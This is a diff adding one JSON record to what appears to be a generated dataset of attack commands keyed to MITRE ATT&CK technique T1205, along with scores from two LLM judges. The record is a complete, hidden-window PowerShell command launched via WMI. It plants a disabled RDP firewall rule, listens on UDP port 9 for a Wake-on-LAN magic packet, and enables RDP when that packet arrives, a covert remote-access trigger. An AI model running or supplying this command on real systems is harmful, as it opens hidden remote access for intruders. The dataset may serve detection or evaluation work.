@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RDP-WoL'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RDP-WoL'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-WoL'' -Enabled False }; $mac=''00-11-22-33-44-55''; $macBytes=($mac -split ''[-:]'' | ForEach-Object {[Convert]::ToByte($_,16)}); $ff=[byte[]](0xFF,0xFF,0xFF,0xFF,0xFF,0xFF); $pattern=$ff; for($i=0;$i -lt 16;$i++){ $pattern += $macBytes }; $u=New-Object System.Net.Sockets.UdpClient(9); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -ge $pattern.Length){ $ok=$true; for($i=0;$i -lt $pattern.Length;$i++){ if($d[$i] -ne $pattern[$i]){$ok=$false;break} }; if($ok){ Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-WoL'' -Enabled True; break } } } }'",
+  "explanation": "Listens for a Wake-on-LAN magic packet (application-specific packet format) matching a target MAC. Upon detection, it enables a disabled Windows Firewall rule to allow RDP. This leverages traffic signaling to trigger firewall changes.",
+  "rationale_steps": [
+    "Create disabled inbound firewall rule for TCP/3389 (RDP).",
+    "Listen on UDP/9 for a WOL magic packet and verify its byte pattern (6x 0xFF + 16x MAC).",
+    "If the pattern matches, enable the RDP rule."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-f28f126a",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting/brace usage and valid PowerShell/exe flags (-NoP, -W Hidden) make the command well-formed and parseable via Win32_Process Create.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements a UDP/9 WoL magic-packet trigger to enable a disabled RDP firewall rule (consistent with traffic signaling), but in practice requires administrative rights (and inbound UDP/9 allowance) to succeed.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T17:46:36.398875Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command within the ArgumentList is perfectly well-formed, featuring balanced quotes, valid flags, proper command separators, and correct syntax for all operations.",
+        "semantic_score": 4,
+        "semantic_justification": "The command perfectly demonstrates traffic signaling (T1205) by using a specific network packet (WoL magic packet) as a trigger to enable an RDP firewall rule, though the stated 'Privilege: None' is incorrect as firewall modifications require administrator privileges.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T17:46:59.786261Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
